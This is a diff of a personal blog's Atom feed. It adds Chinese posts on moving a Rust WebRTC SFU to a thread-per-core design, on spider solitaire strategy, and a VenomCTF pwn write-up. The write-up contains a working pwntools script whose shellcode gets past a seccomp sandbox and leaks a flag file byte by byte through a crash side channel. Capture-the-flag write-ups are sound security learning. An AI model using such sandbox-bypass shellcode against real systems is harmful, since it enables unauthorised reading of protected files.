@@ -6,7 +6,7 @@
   <link href="https://aucept.in/atom.xml" rel="self"/>
   
   <link href="https://aucept.in/"/>
-  <updated>2026-05-19T15:36:41.122Z</updated>
+  <updated>2026-07-19T15:50:10.733Z</updated>
   <id>https://aucept.in/</id>
   
   <author>
@@ -18,11 +18,317 @@
   <follow_challenge><feedId>230229871042106368</feedId><userId>230228883350077440</userId></follow_challenge>
   
   <entry>
+    <title>Moving a Rust WebRTC SFU to thread-per-core</title>
+    <link href="https://aucept.in/2026/07/19/Moving%20a%20Rust%20WebRTC%20SFU%20to%20thread-per-core/"/>
+    <id>https://aucept.in/2026/07/19/Moving%20a%20Rust%20WebRTC%20SFU%20to%20thread-per-core/</id>
+    <published>2026-07-19T15:00:00.000Z</published>
+    <updated>2026-07-19T15:50:10.733Z</updated>
+    
+    <content type="html"><![CDATA[<p><a href="https://pulsebeam.dev/blog/moving-to-thread-per-core">原文：Moving a Rust WebRTC SFU to thread-per-core</a></p>
+<p>概述：作者最近将他们的 WebRTC SFU 服务从 Tokio 默认的多线程工作窃取模型切换到了 thread-per-core（每核一线程）架构，将 P99.99 端到端延迟从偶尔冲到 70 ms 降至稳定的 10 ms，同时将系统容量提高了 25%。这里的 P99.99 是指 99.99% 的延迟样本不超过该值。</p>
+<h2 id="WebRTC-SFU">WebRTC SFU</h2>
+<p>WebRTC SFU，即 Web Real-Time Communication Selective Forwarding Unit，基于 WebRTC 协议的选择性转发单元。比如三人彼此视频聊天，这个项目承担的就是接收并转发视频数据流的工作，因此需要高性能和极低的延迟。</p>
+<h2 id="早期设计">早期设计</h2>
+<p>第一版 SFU 基于 Rust 的 Tokio 多线程调度器实现，并依照 CSP 并发模型建立了最直观的抽象：每个 <code>participant</code>、<code>room</code>、<code>controller</code> 和 <code>API</code> 都有对应的 <code>task</code>，这些任务通过 <code>channel</code> 交流。</p>
+<p><img src="/image/WebRTC_SFU/fine-tasks.png" alt="基于 CSP 模型的多任务处理流水线"></p>
+<p><em>图：每次在任务之间传递数据，都要经过一次 channel。</em></p>
+<p>低负载时，系统工作得很好。但是在 4 核设备上运行模拟四人全交互会议的基准测试时，问题开始暴露：WebRTC 统计数据显示，入站 RTP（Real-time Transport Protocol）流的抖动不断增大且不稳定，拖低了拥塞控制器的带宽估计值，最后造成画面卡顿。此时 CPU 占用率只有 80%，火焰图看起来也没有明显异常，唯独 Tokio 的任务窃取次数高得异常。</p>
+<p>深入研究 <a href="https://tokio.rs/blog/2019-10-scheduler">Tokio 调度器的内部实现</a> 后，作者发现罪魁祸首是在热路径上派生了过多的异步任务。</p>
+<p>每次通过 channel 收发消息，都可能成为一个让出执行权的位置：执行器可能挂起当前任务，转而运行其他任务。在 Tokio 的工作窃取调度器中，这个“其他任务”可能只是另一个刚刚到达的数据包。一个已经接近处理完成的包，反而可能被一个才刚刚进入流水线的包插队。</p>
+<p>WebRTC 数据包通常很小，大约为 500～1200 字节。因此，channel、调度和任务切换等每个包都会承担的固定开销会迅速累积。</p>
+<h2 id="解决方案">解决方案</h2>
+<p>得益于 <code>str0m</code> 库不对线程和时间管理方式作出假设，作者团队可以轻松更换并发模型，而不需要重写整个媒体栈。</p>
+<blockquote>
+<p><code>str0m</code> 是一个 WebRTC 协议实现，包括：</p>
+<ul>
+<li>SDP Offer/Answer 协商</li>
+<li>ICE 连接建立</li>
+<li>DTLS 与 SRTP 加密</li>
+<li>RTP/RTCP 收发与封包</li>
+<li>音视频帧和 RTP 数据包接口</li>
+<li>Data Channel</li>
+<li>NACK 与关键帧请求</li>
+<li>Simulcast</li>
+<li>Transport-wide Congestion Control</li>
+<li>带宽估计和统计信息</li>
+</ul>
+<p>这些功能不是本文的重点，因而不作展开。</p>
+</blockquote>
+<p><img src="/image/WebRTC_SFU/single-core.png" alt="移除 channel 后的单任务处理流水线"></p>
+<p><em>图：接收、分流、处理和发送都在同一个任务中同步完成。</em></p>
+<p>既然问题出在异步调度，那么解决方法也很直观：移除热路径上的 channel，把每个包的若干处理流程合并成一个同步执行的任务。相比负载差异很大的典型 HTTP 请求，WebRTC SFU 的负载基于数据流、更加可预测，天然更适合每核一线程的设计。</p>
+<p>这种方法并不罕见，<code>Redpanda</code>、<code>Iggy</code> 和 <code>ScyllaDB</code> 等项目也采用了类似的每核分片模式，以保持延迟可控。</p>
+<p>其他 SFU 根据各自不同的目标选择了不同的方法：</p>
+<table>
+<thead>
+<tr>
+<th>SFU</th>
+<th>并发架构</th>
+<th>优势</th>
+<th>代价</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>LiveKit</td>
+<td>Go 工作窃取，多核心共享任务</td>
+<td>自动均衡负载，CPU 利用率高</td>
+<td>共享状态需要锁，调度更不稳定</td>
+</tr>
+<tr>
+<td>mediasoup</td>
+<td>每核一个进程</td>
+<td>隔离彻底，缓存局部性很好</td>
+<td>多进程和 IPC 更复杂、更耗内存</td>
+</tr>
+<tr>
+<td>PulseBeam</td>
+<td>每核一个线程</td>
+<td>接近进程级隔离，但仍在同一进程</td>
+<td>跨核心通信和静态负载均衡较难</td>
+</tr>
+</tbody>
+</table>
+<p>没有哪个方案是完美的。为了以基本无锁的方式实现更低的延迟，作者引入了更复杂的跨核心通信、更困难的负载均衡，以及某个高负载连接在管理不当时占满整个核心的风险。</p>
+<p><img src="/image/WebRTC_SFU/multi-core.png" alt="每核一线程的多核架构"></p>
+<p><em>图：每个数据线程拥有一个分片，控制线程负责 SDP 协商和流量准入。</em></p>
+<p>具体实现上，作者为每个数据线程启动一个 Tokio <code>LocalRuntime</code>。这并不是最符合每核一线程架构的运行时；<code>compio</code>、<code>glommio</code> 和 <code>monoio</code> 等基于 io_uring 的运行时才是为这种模型设计的。不过，Tokio 更加成熟且拥有庞大的生态，作者也希望避免把时间花在排查异步运行时层面的 Bug 上。</p>
+<p>控制线程负责 SDP 协商（Session Description Protocol，会话描述协议，用于协商并确定媒体通信参数）、节点状态记录、流量速率控制和任务分配。如果数据线程已经达到最大容量，它会延迟或拒绝新的流量。</p>
+<p>各个 <code>shard</code>（分片，在当前架构中严格绑定到一个 CPU 核心）通过网状结构通信，为此重新引入了 <code>channel</code>。不过，它的使用受到严格限制：消息最多只经历一次 channel hop，理想情况下则一次也不需要。</p>
+<h2 id="基准测试">基准测试</h2>
+<p>客户端采用 Rust 编写。每个房间有 4 名全交互式参与者，每人向其他参与者发送一路 360p@30 的视频流，码率约为 400 Kbps。所有参与者均发布同一段预先编码的 H.264 视频，因此不涉及编码或解码。为降低波动性，Simulcast 处于禁用状态。</p>
+<p>测试每秒新建一个房间，参与者在 15 秒的时间窗口内均匀加入，以模拟真实用户的到达模式。系统达到 120 个房间后停止创建新房间。在此峰值下，系统承载 480 名并发参与者，并在工作窃取调度器下使 CPU 使用率维持在约 80%。客户端采集两项关键指标：ICE 往返时延和端到端延迟。</p>
+<blockquote>
+<ul>
+<li><strong>H.264</strong>：一种有损视频压缩标准。测试直接重放预先编码的视频，不进行实时编解码。</li>
+<li><strong>Simulcast</strong>：同步联播，让客户端同时发送同一视频的多个不同质量或分辨率版本。</li>
+<li><strong>ICE round-trip time</strong>：ICE 往返时延。</li>
+</ul>
+</blockquote>
+<p>服务器运行在 4 个隔离的 i9-12900HK 性能核（P-core）上，核心降频至 1.8 GHz，并关闭超线程与睿频加速，以模拟注重成本的实际部署所采用的低配硬件。CPU 隔离通过以下内核参数实现：<code>isolcpus=1-4 nohz_full=1-4 rcu_nocbs=1-4</code>。</p>
+<h3 id="ICE-往返时延">ICE 往返时延</h3>
+<p>ICE RTT 的测量没有扇出过程：服务器收到一个 STUN Binding Request 后，只向请求来源回复一个 STUN Binding Response。发送端收到响应后，即可计算往返时延（RTT）。</p>
+<p><img src="/image/WebRTC_SFU/ws-rtt.png" alt="工作窃取 Tokio 下的 ICE RTT 分布"></p>
+<p><em>图：修改前，工作窃取 Tokio 下的 ICE RTT 分布。P99.99 尾延迟明显高于 P50。</em></p>
+<p><img src="/image/WebRTC_SFU/tpc-rtt.png" alt="每核一线程架构下的 ICE RTT 分布"></p>
+<p><em>图：改为每核一线程后，ICE RTT 的分布更加集中。</em></p>
+<h3 id="端到端延迟">端到端延迟</h3>
+<p><img src="/image/WebRTC_SFU/metrics-e2e.png" alt="通过 abs-capture-time 推导端到端延迟"></p>
+<p><em>图：通过 abs-capture-time 头部扩展推导端到端延迟。</em></p>
+<p>对于每一帧，发布端都会通过 <code>abs-capture-time</code> 头部扩展，将当前的单调时钟值注入 RTP 包。由于订阅端与发布端运行在同一台机器上，可以直接用接收时间减去该帧的 <code>abs-capture-time</code>，从而准确计算端到端延迟。</p>
+<p><img src="/image/WebRTC_SFU/ws-e2e.png" alt="工作窃取 Tokio 下的端到端延迟分布"></p>
+<p><em>图：工作窃取 Tokio 下的端到端延迟分布，P99.99 尾延迟很不稳定。</em></p>
+<p><img src="/image/WebRTC_SFU/tpc-e2e.png" alt="每核一线程架构下的端到端延迟分布"></p>
+<p><em>图：改为每核一线程后，尾延迟明显稳定了。</em></p>
+<h3 id="额外测试：每核一线程架构达到-80-CPU">额外测试：每核一线程架构达到 80% CPU</h3>
+<p>将负载提高到 150 个房间后，CPU 占用率达到 80%，但测试中的延迟依旧稳定。此时，服务器的瓶颈已经从 CPU 转移到了网卡。</p>
+<p><img src="/image/WebRTC_SFU/tpc_max-rtt.png" alt="80% CPU 占用率下的 ICE RTT 分布"></p>
+<p><em>图：每核一线程架构达到 80% CPU 时的 ICE RTT 分布。</em></p>
+<p><img src="/image/WebRTC_SFU/tpc_max-e2e-2.png" alt="80% CPU 占用率下的端到端延迟分布"></p>
+<p><em>图：每核一线程架构达到 80% CPU 时的端到端延迟分布。</em></p>
+<h2 id="展望">展望</h2>
+<p><code>thread-per-core</code> 架构下还有更多值得探索的内容：</p>
+<ul>
+<li>使用 <code>io_uring</code> 减少系统调用和内存复制</li>
+<li>使用 eBPF RSS steering（Receive Side Scaling，接收端扩展）避免数据包跨核心处理</li>
+<li>比较面向对象（OOP）与实体组件系统（ECS），以改善 CPU 缓存行为</li>
+</ul>
+<h2 id="总结">总结</h2>
+<p>许久没有更新了。之所以选择这一篇分享，是因为本文展现了一个相对完整且专业的“系统设计—性能缺陷—优化测试”流程。从并发模型的选择，到问题的诊断方法和优化方案，再到基准测试的设计……很多细节都值得学习。</p>
+]]></content>
+    
+    
+      
+      
+        
+        
+    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://pulsebeam.dev/blog/moving-to-thread-per-core&quot;&gt;原文：Moving a Rust WebRTC SFU to thread-per-core&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;概述：作者最近将他们的</summary>
+        
+      
+    
+    
+    
+    <category term="温馨的阅读时光" scheme="https://aucept.in/categories/%E6%B8%A9%E9%A6%A8%E7%9A%84%E9%98%85%E8%AF%BB%E6%97%B6%E5%85%89/"/>
+    
+    
+    <category term="rust" scheme="https://aucept.in/tags/rust/"/>
+    
+    <category term="tokio" scheme="https://aucept.in/tags/tokio/"/>
+    
+    <category term="WebRTC" scheme="https://aucept.in/tags/WebRTC/"/>
+    
+    <category term="concurrency model" scheme="https://aucept.in/tags/concurrency-model/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Spider Solitaire</title>
+    <link href="https://aucept.in/2026/07/18/spider-solitaire/"/>
+    <id>https://aucept.in/2026/07/18/spider-solitaire/</id>
+    <published>2026-07-18T12:00:00.000Z</published>
+    <updated>2026-07-19T15:50:36.469Z</updated>
+    
+    <content type="html"><![CDATA[<p>亲爱的读者，我来向你介绍我接触这个游戏以来的重要经验</p>
+<p>基本规则想必不用我说了，我只讲我认为重要的策略</p>
+<h2 id="放弃">放弃</h2>
+<p>不是每一局都一定能有结果。不在错误的局中浪费时间是一种智慧。诚然，死中求活、挑战不可能的精神值得敬佩，但大多数人并没有意识到其背后的沉重代价。你付出时间，你耗费脑力，你在绝境中苦苦挣扎，你最后依然一无所获。</p>
+<p>所以，如果开局极其不顺，即使某个局部似乎透着一丝转机，也请优先考虑换一局。</p>
+<p>那么，如何界定开局是否顺利？</p>
+<h2 id="余地">余地</h2>
+<p>我的答案是“余地”。</p>
+<p>只要在初步尝试时能争取到宝贵的余地，这一局就值得尝试。</p>
+<p>余地的作用极大，它意味着你摆脱了被动与束缚，拥有了自主呼吸的空间。于是过去的失误可以弥补，于是更多深层的信息得以展露，于是结构与方向的调整也成为可能。我以为，从被动地被推着走，转为有选择地向前迈进，才是一局真正的开始。</p>
+<p>倘若迟迟等不到这份余地，你便只能听凭命运摆布。你不得不接受拧巴的发展，你前进的每一步都在为未来埋下隐患，最后只能在绝望中放弃，一无所获。</p>
+<h2 id="信息">信息</h2>
+<p>余地只是给予了腾挪的空间，想要最终的圆满，离不开信息的获取。</p>
+<p>事实上，从一开始，增进了解的优先级就是最高的。迷雾中的推进盲目且危险，余地给了你选择的自由，而获取信息增进了解才是破局的关键。</p>
+<p>记住，看似无用的移动总是有其价值，缩小空间为代价的整理往往只是虚假的顺利</p>
+<h2 id="Deal">Deal</h2>
+<p>做出“Deal”的决定必须极其谨慎。它既是走投无路时的生机，也是滑向失控深渊的推手。</p>
+<p>有人认为 Deal 是打破僵局的必要手段，且越早推进越好。事实上，这种举动确实能暴露出大量信息，提前暗示你哪里是死胡同，哪里尚有可为。但它的红利也仅限于此。它对局势复杂性的成倍增加往往是致命的，会无情地锁死你原本好不容易攒下的空间。因此，一般来说不应轻易接受。</p>
+<p>理想中的deal，应该是平稳发展但陷入僵局时的变量，是可能性，是只要处理好就能迈过当前瓶颈的机会。</p>
+<h2 id="不完美">不完美</h2>
+<p>有人总是渴望能一步到位、顺顺利利，但那太奢求运气了。</p>
+<p>大部分的圆满都是无数次“Undo”努力的结果。所以，要接纳并习惯过程中的曲折与不完美。利用试错去修正轨迹，在迂回中不断增进对全局的了解，才是最大的助力。</p>
+<p>那么，让我们回看第一点，真正应当放弃的并非暂时难看的局面，而是那些经过试探后，仍然无法产生余地、无法获取有效信息、只能不断透支选择权的局面。</p>
+]]></content>
+    
+    
+      
+      
+        
+        
+    <summary type="html">&lt;p&gt;亲爱的读者，我来向你介绍我接触这个游戏以来的重要经验&lt;/p&gt;
+&lt;p&gt;基本规则想必不用我说了，我只讲我认为重要的策略&lt;/p&gt;
+&lt;h2</summary>
+        
+      
+    
+    
+    
+    <category term="随笔" scheme="https://aucept.in/categories/%E9%9A%8F%E7%AC%94/"/>
+    
+    
+    <category term="Spider Solitaire" scheme="https://aucept.in/tags/Spider-Solitaire/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>VenomCTF WP</title>
+    <link href="https://aucept.in/2026/07/17/VenomCTF-WP/"/>
+    <id>https://aucept.in/2026/07/17/VenomCTF-WP/</id>
+    <published>2026-07-17T07:53:25.449Z</published>
+    <updated>2026-07-17T07:53:25.450Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="good-night">good_night</h2>
+<p>初看朝阳东升，不解题中意，再看四野寂寂，已成题中人</p>
+<p>指早八看到这道题晚八还没解出来，good night</p>
+<p>程序有栈溢出，反复地读然后复制到会越界的地方，约等于一个多一字节溢出，可以把返回地址改成<code>leave ret</code></p>
+<p>然后给了一个bss段读，可以进行布置，开始rop。</p>
+<p>题目说预期解是ret2ld，又提示可以考虑使用ret2dl来泄漏libc地址，再提示ret2dl不单可以调用函数也可以尝试调用libc中的gadget，总结下来就是不会</p>
+<h2 id="never">never</h2>
+<p>一个沙盒环境，禁了execve、read、write及部分变体，然后给了一个固定的页并执行</p>
+<p>考虑ORW，open没有禁，read可以用mmap映射完成读，但是w缺失，考虑用一些状态间接反应</p>
+<p>调试时发现程序段错误会有输出，启动脚本会报错，所以经过设计，逐字节mmap 当前目录下的flag文件，然后和指定字符比较，如果一致转去执行一个触发段错误的指令，不一致则exit，无报错输出</p>
+<p>然后爆破：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">,</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+HOST <span class="token operator">=</span> <span class="token string">'47.98.117.93'</span>
+PORT <span class="token operator">=</span> <span class="token number">53698</span>
+
+<span class="token keyword">def</span> <span class="token function">test_char</span><span class="token punctuation">(</span>position<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> test_value<span class="token operator">=</span><span class="token number">102</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token triple-quoted-string string">"""测试指定位置的字符是否等于test_value"""</span>
+    
+    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"测试: flag[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>position<span class="token punctuation">&#125;</span></span><span class="token string">] == </span><span class="token interpolation"><span class="token punctuation">&#123;</span>test_value<span class="token punctuation">&#125;</span></span><span class="token string"> ('</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">chr</span><span class="token punctuation">(</span>test_value<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">')?"</span></span><span class="token punctuation">)</span>
+    
+    s <span class="token operator">=</span> remote<span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span>
+    s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"ideas!"</span><span class="token punctuation">)</span>
+    
+    shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'''
+        mov r14, 0xDEADB800
+        mov dword ptr [r14], 0x67616c66
+        
+        mov r15, 0xDEADB100
+        mov byte ptr [r15], 0x0f
+        mov byte ptr [r15+1], 0x05
+        mov byte ptr [r15+2], 0xc3
+        
+        mov rdi, 0xDEADB800
+        xor rsi, rsi
+        mov rax, 2
+        call r15
+        mov r12, rax
+        
+        xor rdi, rdi
+        mov rsi, 100
+        mov rdx, 1
+        mov r10, 2
+        mov r8, r12
+        xor r9, r9
+        mov rax, 9
+        call r15
+        
+        mov rbx, rax
+        add rbx, </span><span class="token interpolation"><span class="token punctuation">&#123;</span>position<span class="token punctuation">&#125;</span></span><span class="token string">
+        mov dl, byte ptr [rbx]
+        mov cl, </span><span class="token interpolation"><span class="token punctuation">&#123;</span>test_value<span class="token punctuation">&#125;</span></span><span class="token string">
+        cmp dl, cl
+        je crash
+        
+        xor rdi, rdi
+        mov rax, 60
+        call r15
+        
+        crash:
+        mov rax, 0xdeadbeef
+        mov rbx, qword ptr [rax]
+    '''</span></span><span class="token punctuation">)</span>
+    
+    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>shellcode<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token string">b'\x90'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    
+    s<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    test_char<span class="token punctuation">(</span>?<span class="token punctuation">,</span>?<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="magic">magic</h2>
+<p>除了一个栈溢出似乎什么也没有</p>
+<p>提示需要用到两个magic gadget</p>
+<p>找了半天只找到一个<code>add DWORD PTR [rbp-0x3d],ebx</code>，不会用</p>
+<h2 id="总结">总结</h2>
+<p>坏消息是只解出一道题</p>
+<p>好消息是pwn的三道题除了这道never都是0解，magic甚至官方没放wp（打算明年接着用……</p>
+]]></content>
+    
+    
+      
+      
+        
+        
+    <summary type="html">&lt;h2 id=&quot;good-night&quot;&gt;good_night&lt;/h2&gt;
+&lt;p&gt;初看朝阳东升，不解题中意，再看四野寂寂，已成题中人&lt;/p&gt;
+&lt;p&gt;指早八看到这道题晚八还没解出来，good</summary>
+        
+      
+    
+    
+    
+    <category term="ctf" scheme="https://aucept.in/categories/ctf/"/>
+    
+    
+    <category term="pwn" scheme="https://aucept.in/tags/pwn/"/>
+    
+    <category term="orw" scheme="https://aucept.in/tags/orw/"/>
+    
+  </entry>
+  
+  <entry>
     <title>Macro in rust</title>
     <link href="https://aucept.in/2026/05/16/Macro-in-rust/"/>
     <id>https://aucept.in/2026/05/16/Macro-in-rust/</id>
     <published>2026-05-16T05:46:25.000Z</published>
-    <updated>2026-05-19T15:36:41.122Z</updated>
+    <updated>2026-07-17T07:53:25.437Z</updated>
     
     <content type="html"><![CDATA[<p>本文又名《重生之我要成为rust魔法师》《五题三库粉碎魔法梦》</p>
 <p>学习一下rust宏，参考资料：</p>
@@ -1447,7 +1753,7 @@
     <link href="https://aucept.in/2026/05/15/All-the-ways-to-mock-your-Rust-code/"/>
     <id>https://aucept.in/2026/05/15/All-the-ways-to-mock-your-Rust-code/</id>
     <published>2026-05-15T06:25:20.000Z</published>
-    <updated>2026-05-16T04:39:35.522Z</updated>
+    <updated>2026-07-17T07:53:25.428Z</updated>
     
     <content type="html"><![CDATA[<p><a href="https://blog.appliedcomputing.io/p/all-the-ways-to-mock-your-rust-code">本文来源</a></p>
 <h2 id="起因">起因</h2>
@@ -1733,7 +2039,7 @@
     <link href="https://aucept.in/2026/04/25/Extend-Rust-s-Testing/"/>
     <id>https://aucept.in/2026/04/25/Extend-Rust-s-Testing/</id>
     <published>2026-04-25T08:00:32.000Z</published>
-    <updated>2026-04-25T09:15:19.075Z</updated>
+    <updated>2026-07-17T07:53:25.433Z</updated>
     
     <content type="html"><![CDATA[<p>本文内容来源:《Rust for Rustaceans》第六章</p>
 <h1>Rust testing mechanism</h1>
@@ -2032,7 +2338,7 @@
     <link href="https://aucept.in/2026/04/11/How-We-Built-Postgres-Compatibility-in-Rust-pgwire-and-DataFusion/"/>
     <id>https://aucept.in/2026/04/11/How-We-Built-Postgres-Compatibility-in-Rust-pgwire-and-DataFusion/</id>
     <published>2026-04-11T09:39:38.000Z</published>
-    <updated>2026-04-11T14:13:57.957Z</updated>
+    <updated>2026-07-17T07:53:25.435Z</updated>
     
     <content type="html"><![CDATA[<p>原文：<a href="https://greptime.com/blogs/2026-04-01-greptimedb-postgresql-compatibility">How We Built Postgres Compatibility in Rust: pgwire and DataFusion</a></p>
 <h2 id="背景：Greptime">背景：Greptime</h2>
@@ -2156,7 +2462,7 @@ Type <span class="token string">"help"</span> <span class="token keyword">for</s
     <link href="https://aucept.in/2026/03/28/Rust-threads-on-the-GPU/"/>
     <id>https://aucept.in/2026/03/28/Rust-threads-on-the-GPU/</id>
     <published>2026-03-28T07:31:09.000Z</published>
-    <updated>2026-03-28T14:30:14.804Z</updated>
+    <updated>2026-07-17T07:53:25.446Z</updated>
     
     <content type="html"><![CDATA[<p><a href="https://www.vectorware.com/blog/threads-on-gpu/">原文网址</a></p>
 <h1>Rust threads on the GPU</h1>
@@ -2378,7 +2684,7 @@ __global__ void <span class="token function">scale</span><span class="token punc
     <link href="https://aucept.in/2026/03/25/%E7%94%A8lvim%E5%AE%8C%E6%88%90%E4%BD%9C%E4%B8%9A/"/>
     <id>https://aucept.in/2026/03/25/%E7%94%A8lvim%E5%AE%8C%E6%88%90%E4%BD%9C%E4%B8%9A/</id>
     <published>2026-03-25T13:23:24.000Z</published>
-    <updated>2026-05-15T06:39:02.986Z</updated>
+    <updated>2026-07-17T07:53:25.463Z</updated>
     
     <content type="html"><![CDATA[<p>本系列的上一篇用wezterm、fish和tmux大大改善了终端的使用体验，随着最近对vim的操作变得熟练，以前依旧要依赖GUI的IDE似乎也可以搬进终端里了</p>
 <p>故事的起因是有些作业相比于手写，还是打字更舒服，但是学校的作业平台又不能直接提交markdown，于是……</p>
@@ -2474,7 +2780,7 @@ table<span class="token punctuation">.</span><span class="token function">insert
     <link href="https://aucept.in/2026/03/21/Using-Rust-and-Postgres-for-everything-patterns-learned-over-the-years/"/>
     <id>https://aucept.in/2026/03/21/Using-Rust-and-Postgres-for-everything-patterns-learned-over-the-years/</id>
     <published>2026-03-21T07:40:35.000Z</published>
-    <updated>2026-04-25T07:34:07.997Z</updated>
+    <updated>2026-07-17T07:53:25.451Z</updated>
     
     <content type="html"><![CDATA[<p>原文网址<a href="https://kerkour.com/rust-postgres-everything">Using Rust and Postgres for everything: patterns learned over the years</a></p>
 <h2 id="Intro">Intro</h2>
@@ -2749,7 +3055,7 @@ CREATE INDEX index_queue_on_status ON queue (status);<span aria-hidden="true" cl
     <link href="https://aucept.in/2026/03/15/The-Cost-of-Indirection-in-Rust/"/>
     <id>https://aucept.in/2026/03/15/The-Cost-of-Indirection-in-Rust/</id>
     <published>2026-03-15T06:02:52.000Z</published>
-    <updated>2026-03-15T12:08:33.934Z</updated>
+    <updated>2026-07-17T07:53:25.448Z</updated>
     
     <content type="html"><![CDATA[<p>原文在这里<a href="https://blog.sebastiansastre.co/posts/cost-of-indirection-in-rust/">The Cost of Indirection in Rust</a> 依旧来自This Week in Rust</p>
 <blockquote>
@@ -2828,7 +3134,7 @@ CREATE INDEX index_queue_on_status ON queue (status);<span aria-hidden="true" cl
     <link href="https://aucept.in/2026/03/14/Compendium_Adding-eBPF-for-Kernel-Level-Visibility/"/>
     <id>https://aucept.in/2026/03/14/Compendium_Adding-eBPF-for-Kernel-Level-Visibility/</id>
     <published>2026-03-14T07:13:30.000Z</published>
-    <updated>2026-04-24T03:49:01.268Z</updated>
+    <updated>2026-07-17T07:53:25.430Z</updated>
     
     <content type="html"><![CDATA[<p>新分类，其实是读各路文章的笔记</p>
 <p>原文网址<a href="https://pker.xyz/posts/compendium-ebpf#intro">Compendium: Adding eBPF for Kernel-Level Visibility</a>，发表在This Week in Rust上，作者介绍了自己的学习项目Compendium</p>
@@ -2913,7 +3219,7 @@ CREATE INDEX index_queue_on_status ON queue (status);<span aria-hidden="true" cl
     <link href="https://aucept.in/2026/02/03/UniCTF/"/>
     <id>https://aucept.in/2026/02/03/UniCTF/</id>
     <published>2026-02-03T02:00:17.000Z</published>
-    <updated>2026-02-11T08:27:02.506Z</updated>
+    <updated>2026-07-17T07:53:25.447Z</updated>
     
     <content type="html"><![CDATA[<p>为期一周，中间夹杂着其他的事，做得蛮累的</p>
 <h2 id="什么？我不是汇编高手吗？">什么？我不是汇编高手吗？</h2>
@@ -3270,7 +3576,7 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
     <link href="https://aucept.in/2026/01/18/tauri-2-%E8%87%AA%E5%8A%A8%E6%9B%B4%E6%96%B0/"/>
     <id>https://aucept.in/2026/01/18/tauri-2-%E8%87%AA%E5%8A%A8%E6%9B%B4%E6%96%B0/</id>
     <published>2026-01-18T15:09:19.000Z</published>
-    <updated>2026-01-19T12:36:47.030Z</updated>
+    <updated>2026-07-17T07:53:25.449Z</updated>
     
     <content type="html"><![CDATA[<p>用tauri做项目已经不陌生了，就记录发布之后如何完成自动更新这一步吧</p>
 <h2 id="项目代码">项目代码</h2>
@@ -3386,7 +3692,7 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
     <link href="https://aucept.in/2025/12/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%8E%92%E5%BA%8F%E5%AE%9E%E9%AA%8C/"/>
     <id>https://aucept.in/2025/12/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%8E%92%E5%BA%8F%E5%AE%9E%E9%AA%8C/</id>
     <published>2025-12-22T05:03:55.000Z</published>
-    <updated>2026-01-02T13:30:29.965Z</updated>
+    <updated>2026-07-17T07:53:25.461Z</updated>
     
     <content type="html"><![CDATA[<h2 id="题目">题目</h2>
 <h3 id="内部排序算法比较">内部排序算法比较</h3>
@@ -4042,7 +4348,7 @@ running <span class="token number">0</span> tests
     <link href="https://aucept.in/2025/12/16/%E9%94%88%E5%8C%96%E7%9A%84%E5%A4%A7%E4%BD%9C%E4%B8%9A/"/>
     <id>https://aucept.in/2025/12/16/%E9%94%88%E5%8C%96%E7%9A%84%E5%A4%A7%E4%BD%9C%E4%B8%9A/</id>
     <published>2025-12-16T04:11:59.000Z</published>
-    <updated>2025-12-23T13:18:41.085Z</updated>
+    <updated>2026-07-17T07:53:25.467Z</updated>
     
     <content type="html"><![CDATA[<p>如题，其实是java的大作业，但是锈化版，只是熟悉各种常用依赖</p>
 <p><a href="https://github.com/AuceptinFang/rusty_java_final_lab.git">https://github.com/AuceptinFang/rusty_java_final_lab.git</a></p>
@@ -4072,7 +4378,7 @@ running <span class="token number">0</span> tests
     <link href="https://aucept.in/2025/12/12/Oauth2-%E4%B8%8E-OIDC/"/>
     <id>https://aucept.in/2025/12/12/Oauth2-%E4%B8%8E-OIDC/</id>
     <published>2025-12-12T11:31:14.000Z</published>
-    <updated>2026-04-25T09:08:40.315Z</updated>
+    <updated>2026-07-17T07:53:25.444Z</updated>
     
